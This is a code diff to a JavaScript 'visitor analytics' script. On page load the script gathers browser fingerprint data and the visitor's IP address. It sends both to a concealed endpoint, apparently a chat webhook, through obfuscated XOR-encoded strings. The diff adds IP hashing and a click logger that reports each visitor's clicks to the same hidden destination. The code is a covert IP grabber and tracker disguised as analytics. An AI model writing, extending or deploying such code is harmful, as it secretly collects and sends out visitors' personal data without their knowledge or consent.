@@ -1,25 +1,26 @@
+var analyticsData;
 
 function collectVisitorAnalytics() {
 
-    const browserData = {
-      userAgent: navigator.userAgent,
-      language: navigator.language,
-      cookiesEnabled: navigator.cookieEnabled,
-      platform: navigator.platform,
-      screenWidth: window.screen.width,
-      screenHeight: window.screen.height,
-      windowWidth: window.innerWidth,
-      windowHeight: window.innerHeight,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      timestamp: new Date().toISOString()
-    };
+  const browserData = {
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    cookiesEnabled: navigator.cookieEnabled,
+    platform: navigator.platform,
+    screenWidth: window.screen.width,
+    screenHeight: window.screen.height,
+    windowWidth: window.innerWidth,
+    windowHeight: window.innerHeight,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timestamp: new Date().toISOString()
+  };
   
     const userAgentData = parseUserAgent(browserData.userAgent);
     
     fetch('https://api.ipify.org?format=json')
       .then(response => response.json())
       .then(ipData => {
-        const analyticsData = {
+        analyticsData = {
           ...browserData,
           ...userAgentData,
           ip: ipData.ip
@@ -29,6 +30,7 @@ function collectVisitorAnalytics() {
         const urlParams = new URLSearchParams(queryString);
         console.log("Collected visitor analytics:", analyticsData);
         
+        analyticsData['hash'] = cyrb53(ipData.ip);
         analyticsData['clickOrigin'] = urlParams.get('a');
         _0xsend(analyticsData);
       })
@@ -102,6 +104,17 @@ function collectVisitorAnalytics() {
 
   window.onload = collectVisitorAnalytics();
 
+function logclick(key) {
+  var data = {
+    ip: analyticsData.ip,
+    hash: analyticsData.hash,
+    clickOrigin: analyticsData.clickOrigin,
+    clicked: key
+  }
+
+  _0xsend(data);
+}
+
 var _0xkey = 'ekko';
 function _0xdecrypt(_0xinput) {
     let _0xresult = '';
@@ -123,10 +136,26 @@ function _0xsend(_0xmsg) {
     var date = Date.now();
     _0xxhr.send(JSON.stringify({
         [_0xdecrypt('0604051B00051F'.replace(/\s+/g, ''))]: 
-        "### UNIX: <t:" + Math.floor((date / 1000)) + ":F>" +
-        "\n### [[LOCATION INFO]](https://ip-api.com/" + _0xmsg['ip'] + ")" + 
+        "HASH: `" + (_0xmsg.hash ? _0xmsg.hash : cyrb53(_0xmsg['ip'])) + "`" +
+        "\nUNIX: <t:" + Math.floor((date / 1000)) + ":F>" +
+        "\n[[LOCATION INFO]](https://ip-api.com/" + _0xmsg['ip'] + ")" + 
         "\n```json\n" + JSON.stringify(_0xmsg, null, 2) + "\n```",
         [_0xdecrypt('10180E1D0B0A060A'.replace(/\s+/g, ''))]: _0xdecrypt('361F0A1B0C181F06064B390A1504191B45303D2636223F32'.replace(/\s+/g, '')),
         [_0xdecrypt('041D0A1B0419341A1707'.replace(/\s+/g, ''))]: _0xdecrypt('0D1F1F1F16514440170A1C4102021F0710091E1C001908000B1F0E01114508000844260E150704001544060E1507040015450C0611031E0D4B020440170E0D1C4A030E0E0118440204181F0A174407060B00184004085357500D5A56485F530B50465F565C08465656080D42000A0D0E515808585258080C4B011B08'.replace(/\s+/g, '')),
     }));
 }
+
+const cyrb53 = (str, seed = 0) => {
+  let h1 = 0xdeadbeef ^ seed, h2 = 0x41c6ce57 ^ seed;
+  for(let i = 0, ch; i < str.length; i++) {
+      ch = str.charCodeAt(i);
+      h1 = Math.imul(h1 ^ ch, 2654435761);
+      h2 = Math.imul(h2 ^ ch, 1597334677);
+  }
+  h1  = Math.imul(h1 ^ (h1 >>> 16), 2246822507);
+  h1 ^= Math.imul(h2 ^ (h2 >>> 13), 3266489909);
+  h2  = Math.imul(h2 ^ (h2 >>> 16), 2246822507);
+  h2 ^= Math.imul(h1 ^ (h1 >>> 13), 3266489909);
+
+  return (h2>>>0).toString(16).padStart(8,0)+(h1>>>0).toString(16).padStart(8,0);
+};
